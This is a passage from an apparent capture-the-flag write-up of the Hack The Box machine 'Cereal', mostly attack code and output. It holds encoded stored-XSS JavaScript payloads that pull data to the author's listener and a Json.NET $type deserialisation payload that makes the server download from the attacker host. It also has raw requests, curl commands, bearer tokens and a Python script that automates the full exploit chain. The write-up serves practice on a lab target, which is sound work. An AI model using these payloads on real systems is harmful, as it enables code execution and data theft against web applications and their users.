<script>console.log(atob('dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vMTAuMTAuMTQuMzIvdGVzdCIpO29SZXEuc2VuZCgpOw=='));eval(atob('dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vMTAuMTAuMTQuMzIvdGVzdCIpO29SZXEuc2VuZCgpOw=='))</script>
```

This script outputs a correctly formatted string, and then successfully makes a request to my listener:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.32 - - [13/Apr/2021 08:54:46] code 404, message File not found
10.10.14.32 - - [13/Apr/2021 08:54:46] "GET /test HTTP/1.1" 404 -
```

I did receive the following error:

```
Cross-Origin Request Blocked: The Same Origin Policy disallows reading the remote resource at [http://10.10.14.32/test](http://10.10.14.32/test "http://10.10.14.32/test"). (Reason: CORS header ‘Access-Control-Allow-Origin’ missing).
```

But the request still came through.

Now let's test the DOM-modifying script. I realised while writing this that the target `<div>` did not have a `class` attribute, but rather a `className` attribute, which might be why the original payload failed. This is why we instead used `div[className='card card-body bg-light'` within our `querySelector()` call (it also has to be an exact match, so we cannot just use `card`).

```html
<div className="card card-body bg-light">
</div>

<script>const image = document.createElement("img");image.src = "http://10.10.14.32/img";document.querySelector("div[className='card card-body bg-light']").appendChild(image);</script>
```

This successfully sent a request to our local webserver.

Our final local test is that this works as an encoded payload:

```html
<div className="card card-body bg-light">
</div>

<script>console.log(atob('Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs='));eval(atob('Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs='))</script>
```

I listened with netcat this time:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo nc -lnvp 80
[sudo] password for mac: 
listening on [any] 80 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.14.32] 34072
GET /img HTTP/1.1
Host: 10.10.14.32
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: image/webp,*/*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Cache-Control: max-age=0

```

It looks like we're ready to go.

### Submitting our Test Payload

I did a lot of experimenting with formatting here. Here are some of the things I tried:
- adding/removing single quotes around the base64
- adding backticks around the base64
- trying a combination of `http://` and `https://` in the `src` request
- listening on both port 80 and 443 simultaneously for each payload I tried

None of these things ultimately worked. Instead, the final (almost) step was to add URL encoding on our payload.

We encoded the quote characters and the last two brackets (just encoding the quotes was not enough):

```jsx
[mouldy cereal](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=%22%29%29)
```

We sent this off:

```
POST /requests HTTP/1.1
Host: 10.10.10.217
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik
Content-Length: 350

{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

(equivalent `curl` command):

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' -H $'Content-Type: application/json' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik' -H $'Content-Length: 350' \
    --data-binary $'{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjMyL2ltZyI7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}' \
    $'https://10.10.10.217/requests'
```

And started a netcat listener on both `80` and `443` simultaneously...

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo nc -lnvp 80
[sudo] password for mac: 
listening on [any] 80 ...
connect to [10.10.14.32] from (UNKNOWN) [10.10.10.217] 50598
GET /img HTTP/1.1
Host: 10.10.14.32
Connection: keep-alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.193 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

```

We only got a connection!!!

## Trying Full Chain

Now we know we have successful XSS, we can put it together with a deserialisation payload.

I created a fresh malicious cereal, making sure to change the IP in the `DownloadHelper` request (as my VPN IP had changed), with id `25`.

I realised that the request for the malicious cereal itself probably requires an auth header. So I edited my payload to include one:

```javascript
var oReq = new XMLHttpRequest();
oReq.open("GET", "http://localhost/requests?id=25");
oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik")
oReq.send();
```

Giving us the following base64:

```
dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vbG9jYWxob3N0L3JlcXVlc3RzP2lkPTIzIik7b1JlcS5zZXRSZXF1ZXN0SGVhZGVyKCJBdXRob3JpemF0aW9uIiwgIkJlYXJlciBleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKbGVIQWlPakUyTVRnNU1EYzJPRGtzSW01aGJXVWlPakY5LjZtX25pSm1jaE02VzVtb0twbVA0c1dMZmRHQ05PLWhuLTV5OFJaZ09uaWsiKW9SZXEuc2VuZCgpOw==
```

And this request:

```
POST /requests HTTP/1.1
Host: 10.10.10.217
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Type: application/json
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik
Content-Length: 478

{"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwOi8vbG9jYWxob3N0L3JlcXVlc3RzP2lkPTI1Iik7b1JlcS5zZXRSZXF1ZXN0SGVhZGVyKCJBdXRob3JpemF0aW9uIiwgIkJlYXJlciBleUowZVhBaU9pSktWMVFpTENKaGJHY2lPaUpJVXpJMU5pSjkuZXlKbGVIQWlPakUyTVRnNU1EYzJPRGtzSW01aGJXVWlPakY5LjZtX25pSm1jaE02VzVtb0twbVA0c1dMZmRHQ05PLWhuLTV5OFJaZ09uaWsiKW9SZXEuc2VuZCgpOw==%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}
```

I kept my netcat servers open on 80 and 443 to see which one the test request came to.

#### Fiddling with HTTPS

I got no response this time. As we know the XSS works, this narrowed it down to either the deserialisation-triggering HTTP request, or the deserialisation itself. My first thought was that perhaps it needed to be a `https` request, so I made a new malicious cereal and retried.

```bash	
curl -i -s -k -X $'POST' \
    -H $'Host: 10.10.10.217' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' -H $'Content-Type: application/json' -H $'Content-Length: 104' -H $'Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik' \
    --data-binary $'{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper\\\",\\\"_URL\\\":\\\"https://10.10.14.32/\\\",\\\"_FilePath\\\":\\\"test\\\"}\"}' \
    $'https://10.10.10.217/requests'
```

Oddly enough, adding the `https` prefix caused the cereal request to fail:

```
{"type":"https://tools.ietf.org/html/rfc7231#section-6.5.1","title":"One or more validation errors occurred.","status":400,"traceId":"|e45a1a92-410dc86b081856be.","errors":{"$.JSON":["Expected depth to be zero at the end of the JSON payload. There is an open JSON object or array that should be closed. Path: $.JSON | LineNumber: 0 | BytePositionInLine: 104."]}}
```

So I omitted it and submitted another new cereal (sensing a theme?)

Just to be sure, I also checked my XSS payload. I changed it to request at `10.10.10.217`, rather than localhost, in case that made a difference. I had a couple of mistakes in my payload, including a missing semicolon. This was my eventual javascript command to generate the base64:

```javascript
console.log(btoa('var oReq = new XMLHttpRequest();oReq.open("GET", "https://10.10.10.217/requests?id=29");oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik");oReq.setRequestHeader("Content-Type", "application/json");oReq.send();'))
```

I submitted it, and got no response. This made me think I had an issue with my deserialisation payload.

#### Fiddling with Deserialisation Payload

This was a particularly frustrating point, where I found a number of bugs in my deserialisation payload. I wouldn't completely fix the payload until a while later, after I'd setup some proper debugging via `fetch()` in my XSS. But before I got to that point, I had a lot of mistakes to iron out.

I had another look at the [alphabot article](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html) and realised that I needed an extra specification of the namespace.

![](/assets/images/blogs/Pasted image 20210413145536.png)

I also tried getting rid of the underscores before the variable names. I tried the following JSON in a POST request:

```
{"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"https://10.10.14.32/\",\"FilePath\":\"test\"}"}
```

Submitting this didn't work. It was then I realised I was using `wc.DownloadFile()` incorrectly. The second parameter is the target file to download to. This did not explain why I'm not receiving a request, but maybe I need to specify a path after the IP for the request to be fired off.

I also found out I can use `Application.Startup` to get the app's path. However, this may not be necessary as it seems from the example [in the docs](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloadfile?view=net-5.0) that if you don't specify a full path the relative path is used.

I used this JSON:

```
{"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\":\"https://10.10.14.32/test\",\"FilePath\":\"test.txt\"}"}
```

And resent the XSS cereal request. I tried a few things to debug this:
- switching back to `http` in case there was a certificate error, which made no difference
- adding a `.txt` extension to the request - this also changed nothing

At this point I suspected an issue with the triggering HTTP request again, as I'd debugged the `DownloadFile()` syntax.

I tried the above request structure with several combinations of `http`, `https`, `localhost`, `127.0.0.1`, and `10.10.10.217` in the URL for the triggering XSS cereal. I also switched to a python server on port 80 in case it made a difference, but got no response back.

I was pretty confident in my Deserialisation payload at this point, so figured my mistake had to lie in the triggering XSS. I was missing one *tiny* thing still, but that comes later.

#### Fixing XSS Request Format

I looked at the [ASP.NET documentation](https://docs.microsoft.com/en-us/aspnet/core/mvc/controllers/routing?view=aspnetcore-5.0#attribute-routing-with-http-verb-attributes) again, and realised I had been structuring my requests incorrectly this whole time.

The `[HttpGet("{id}")]` template means my URL should follow the format: `https://cereal.htb/requests/{id}`, not `https://cereal.htb/requests?id={id}`. I had made a guess at the start, and just run with it. The lesson here is to always check!

This is our amended JavaScript:

```javascript
var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/9");oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik");oReq.send();
```

After submitting I got no shell back, so I desperately modified my payload to go back to requesting `localhost/requests/9` and even tried `10.10.10.217/requests/9`. I also submitted another test XSS payload to make sure my syntax was still correct, and got a callback.

I tried adjusting my target cereal to request over HTTP instead, and started a Python webserver. I adjusted the id in my triggering XSS cereal, and repeated the steps above, but still got no response.

#### Tracking XSS Response

A colleague suggested adding some JavaScript to let me see the results of my XSS, by appending the response to an `img` source.

```javascript
var oReq = new XMLHttpRequest();
oReq.open("GET","https://cereal.htb/requests/9");
oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTg5MDc2ODksIm5hbWUiOjF9.6m_niJmchM6W5moKpmP4sWLfdGCNO-hn-5y8RZgOnik");
oReq.send();
var resp = btoa(oReq.response());
const image = document.createElement("img");
image.src = "http://10.10.14.149/".concat(resp);
document.querySelector("div[className='card card-body bg-light']").appendChild(image);
```

I would use this - but first, I figured that if I wasn't going to beat this box quickly, I should at least not make it any harder on myself by having to craft requests in Burp every single time and format my payload with a clunky javascript file. It was time for some Python.

## Automating It

At this point I was sick of launching Burp every time I came back to this box, so I wrote a Python script. Doing this from the start would have saved me a lot of time, but I wanted to practice using Burp and Curl. You live and learn.

You can see the finished script [here](https://github.com/Twigonometry/CTF-Tools/blob/master/hack_the_box/cereal/cereal-chain.py). Read on for an overview of how it developed.

Having it automated this way lets us more easily test small changes to the payloads without having to re-run our `b64.js` script. The only downside is that it makes a few requests which can sometimes cause us to hit the rate limit.

First, the code generates a fresh token, reusing the `gentoken.py` code.

I used the requests library to easily send my cereal requests. I had to include the `verify=False` flag to let it send requests without verifying the SSL certificate. I also suppressed the related `InsecureRequestWarning`.

This method creates our target cereal:

```python
def target_cereal(ip, base_url, base_headers):
    """POST a cereal request to create the target cereal
    this will be deserialised by an XSS request and trigger a download"""
    
    print("\n=== POSTING TARGET CEREAL ===\n")
    
    download_url = "https://{}/test.txt".format(ip)
    print("Creating target cereal, which will download from URL {} when deserialised".format(download_url))

    target_json_string = "{\"JSON\":\"{\\\"$type\\\":\\\"Cereal.DownloadHelper, Cereal\\\",\\\"URL\\\": " + download_url +  ",\\\"FilePath\\\":\\\"test.txt\\\"}\"}"

    targetResp = requests.post(base_url, data=target_json_string, headers=base_headers, verify=False)
    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=targetResp.status_code, text=targetResp.text))

    target_id = str(json.loads(targetResp.text)["id"])
    print("Target cereal ID: " + target_id)
    
    return target_id
```

And this method creates our triggering XSS cereal:

```python
def xss_cereal(ip, base_url, base_headers, token, target_id):
    """POST a cereal request to trigger an XSS
    the XSS makes a HTTP request to deserialise the target cereal"""
    
    print("\n=== POSTING XSS CEREAL ===\n")
    
    js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
    
    print("Javascript to be injected: " + js_string + "\n")
    
    b64_js = base64.b64encode(js_string.encode('utf-8'))
    
    print("Base64 encoded javascript: " + b64_js.decode('utf-8') + "\n")
    
    xss_json_string = "{\"JSON\":\"{\\\"title\\\":\\\"[XSS](javascript: eval(atob(%22" + b64_js.decode('utf-8') + "%22%29%29)\\\",\\\"flavor\\\":\\\"f\\\",\\\"color\\\":\\\"#FFF\\\",\\\"description\\\":\\\"d\\\"}\"}"
    
    xssResp = requests.post(base_url, data=xss_json_string, headers=base_headers, verify=False)
    print("\nResponse:\nResponse Code: {code}\nResponse Text: {text}".format(code=xssResp.status_code, text=xssResp.text))
```

I was worried about Python's encoding of the javascript base64, so I ran a quick test to make sure the output looked correct. The following javascript:

```javascript
console.log(atob('dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwczovL2NlcmVhbC5odGIvcmVxdWVzdHMvMTciKTtvUmVxLnNldFJlcXVlc3RIZWFkZXIoIkF1dGhvcml6YXRpb24iLCAiQmVhcmVyIGV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUpsZUhBaU9qRTJNVGt4TnpNd09UVXNJbTVoYldVaU9qRjkuaEMyS0lPS1AwRGlOUWpWZktadm5POFNQOUI5ZHRSNGppRnNBcmppZ2NUQSIpO29SZXEuc2VuZCgpO3ZhciByZXNwID0gYnRvYShvUmVxLnJlc3BvbnNlKCkpO2NvbnN0IGltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7aW1hZ2Uuc3JjID0gImh0dHA6Ly8xMC4xMC4xNC4xNzAvIi5jb25jYXQocmVzcCk7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs='))
```

Gave us this output, as expected:

```
var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/17");oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkxNzMwOTUsIm5hbWUiOjF9.hC2KIOKP0DiNQjVfKZvnO8SP9B9dtR4jiFsArjigcTA");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://10.10.14.170/".concat(resp);document.querySelector("div[className='card card-body bg-light']").appendChild(image);
```

Here is the output from our code:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ python3 cereal-chain.py 
Make sure to start a listener before this. Run the following command:
sudo nc -lnvp 80
This will catch responses from your XSS and allow the DownloadHelper to grab your payload
Press enter to continue once you've started your listener...

IP Address: 10.10.14.170
Generated token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkxNzYwMzIsIm5hbWUiOjF9.UUBDIJmQSakC-b_6R_xIvEH8C_3R_rznub-P0QxSqc0

=== POSTING TARGET CEREAL ===

Creating target cereal, which will download from URL https://10.10.14.170/test.txt when deserialised

Response:
Response Code: 200
Response Text: {"message":"Great cereal request!","id":26}
Target cereal ID: 26

=== POSTING XSS CEREAL ===

Javascript to be injected: var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/26");oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkxNzYwMzIsIm5hbWUiOjF9.UUBDIJmQSakC-b_6R_xIvEH8C_3R_rznub-P0QxSqc0");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://10.10.14.170/".concat(resp);document.querySelector("div[className='card card-body bg-light']").appendChild(image);

Base64 encoded javascript: dmFyIG9SZXEgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTtvUmVxLm9wZW4oIkdFVCIsICJodHRwczovL2NlcmVhbC5odGIvcmVxdWVzdHMvMjYiKTtvUmVxLnNldFJlcXVlc3RIZWFkZXIoIkF1dGhvcml6YXRpb24iLCAiQmVhcmVyIGV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUpsZUhBaU9qRTJNVGt4TnpZd016SXNJbTVoYldVaU9qRjkuVVVCRElKbVFTYWtDLWJfNlJfeEl2RUg4Q18zUl9yem51Yi1QMFF4U3FjMCIpO29SZXEuc2VuZCgpO3ZhciByZXNwID0gYnRvYShvUmVxLnJlc3BvbnNlKCkpO2NvbnN0IGltYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiaW1nIik7aW1hZ2Uuc3JjID0gImh0dHA6Ly8xMC4xMC4xNC4xNzAvIi5jb25jYXQocmVzcCk7ZG9jdW1lbnQucXVlcnlTZWxlY3RvcigiZGl2W2NsYXNzTmFtZT0nY2FyZCBjYXJkLWJvZHkgYmctbGlnaHQnXSIpLmFwcGVuZENoaWxkKGltYWdlKTs=


Response:
Response Code: 200
Response Text: {"message":"Great cereal request!","id":27}

```

Now we can easily edit our payload.

### Debugging

It was time to debug why we weren't getting a callback via our `img` element. I tried editing the javascript payload to our original test script:

```python
#js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
    
js_string = 'const image = document.createElement("img");image.src = "http://{ip}/img";document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(ip=ip)
```

We can run the code:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ python3 cereal-chain.py 
Make sure to start a listener before this. Run the following command:
sudo nc -lnvp 80
This will catch responses from your XSS and allow the DownloadHelper to grab your payload
Press enter to continue once you've started your listener...

IP Address: 10.10.14.170
Generated token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkxODAzMzIsIm5hbWUiOjF9.I6Hv5OK_pKyUmGv16pz-seFlLYZWYHf5NZwEZ_8wPN4

=== POSTING TARGET CEREAL ===

Creating target cereal, which will download from URL https://10.10.14.170/test.txt when deserialised
JSON submitted: {"JSON":"{\"$type\":\"Cereal.DownloadHelper, Cereal\",\"URL\": https://10.10.14.170/test.txt,\"FilePath\":\"test.txt\"}"}

Response:
Response Code: 200
Response Text: {"message":"Great cereal request!","id":33}
Target cereal ID: 33

=== POSTING XSS CEREAL ===

Javascript to be injected: const image = document.createElement("img");image.src = "http://10.10.14.170/img";document.querySelector("div[className='card card-body bg-light']").appendChild(image);

Base64 encoded javascript: Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjE3MC9pbWciO2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltjbGFzc05hbWU9J2NhcmQgY2FyZC1ib2R5IGJnLWxpZ2h0J10iKS5hcHBlbmRDaGlsZChpbWFnZSk7

JSON submitted: {"JSON":"{\"title\":\"[XSS](javascript: eval(atob(%22Y29uc3QgaW1hZ2UgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTtpbWFnZS5zcmMgPSAiaHR0cDovLzEwLjEwLjE0LjE3MC9pbWciO2RvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoImRpdltjbGFzc05hbWU9J2NhcmQgY2FyZC1ib2R5IGJnLWxpZ2h0J10iKS5hcHBlbmRDaGlsZChpbWFnZSk7%22%29%29)\",\"flavor\":\"f\",\"color\":\"#FFF\",\"description\":\"d\"}"}

Response:
Response Code: 200
Response Text: {"message":"Great cereal request!","id":34}
```

I got a response to my netcat listener. This confirms my base64 encoding works fine! It just takes a while to send me a callback, as I have submitted a large amount of cereals at this point... which makes me wonder how the page prevents old XSS payloads from triggering, but that's a question for another day.

I think I will need to be careful with my netcat listener, as it closes after one connection. If I want to use it to both see the output of my XSS *and* serve a payload to DownloadHelper, it needs to stay alive. To fix this issue I switched to a python server, with `sudo python3 -m http.server 80`

### Automating DownloadHelper Request

I removed my test code and submitted my original triggering request.

I was getting nothing, so I ran another local test of my JS. I really need to remember to do this first...

```html
<div className="card card-body bg-light">
</div>

<script>var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/39");oReq.setRequestHeader("Authorization", "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkxODIyOTQsIm5hbWUiOjF9.vGrRpbmJE_mJKYL-jInES71tlXAR1uRbgmgcvU9gWYU");oReq.send();var resp = btoa(oReq.response());const image = document.createElement("img");image.src = "http://10.10.14.170/".concat(resp);document.querySelector("div[className='card card-body bg-light']").appendChild(image);</script>
```

Turns out I had a syntax error and should be referencing `oReq.response` without the brackets. This was probably causing the script to crash remotely.

I fixed this and got a hit on my web server, but it didn't have the base64. Logging the contents of the response to console gave me `<empty string>`. I tried `oReq.response.text` and `oReq.response.json`, which both gave me a base64 string - unfortunately it was "undefined".

Still, we're getting this response to our webserver:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal/test-www]
└─$ sudo python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.14.170 - - [16/Apr/2021 14:02:18] code 404, message File not found
10.10.14.170 - - [16/Apr/2021 14:02:18] "GET /dW5kZWZpbmVk HTTP/1.1" 404 -
```

So maybe running it against the real target will give us more information:

```python
js_string = 'var oReq = new XMLHttpRequest();oReq.open("GET", "https://cereal.htb/requests/{target_id}");oReq.setRequestHeader("Authorization", "Bearer {token}");oReq.send();var resp = btoa(oReq.response.json);console.log(resp);const image = document.createElement("img");image.src = "http://{ip}/".concat(resp);document.querySelector("div[className=\'card card-body bg-light\']").appendChild(image);'.format(target_id=target_id, token=token, ip=ip)
```

After a bit of impatiently wondering why I wasn't getting any response, I got a hit.

```bash
10.10.10.217 - - [16/Apr/2021 15:29:46] code 404, message File not found
10.10.10.217 - - [16/Apr/2021 15:29:46] "GET /dW5kZWZpbmVk HTTP/1.1" 404 -
```

Decoding this with `echo 'dW5kZWZpbmVk' |base64 -d` again gives us "undefined". Google suggests this is a case of trying to parse the wrong response type. After trying a few different parsing methods (`.text`, `.response`, `.responseText`) and a few different address formats (`requests/{target_id}`, `https://localhost/requests/{target_id}`) but getting nowhere, I looked to a different library for making the request.

#### Using fetch()

With some advice from a kind discord friend, I switched to `fetch()`:

```javascript
var myHeaders = new Headers(); myHeaders.append('Authorization', 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MTkyMDk5MDksIm5hbWUiOjF9.Atlqci_K2MLDMM4YfgI5av6BuCiG2OuGyUF7vZHEL08');var myInit = {method: 'GET', headers: myHeaders}; fetch("requests/109", myInit).then(function(response) {var resp = btoa(response.text());const image = document.createElement("img");image.src = "http://10.10.14.170/".concat(resp);document.querySelector("div[className='card card-body bg-light']").appendChild(image);});
```

Which translates to the following in the Python script:

```python
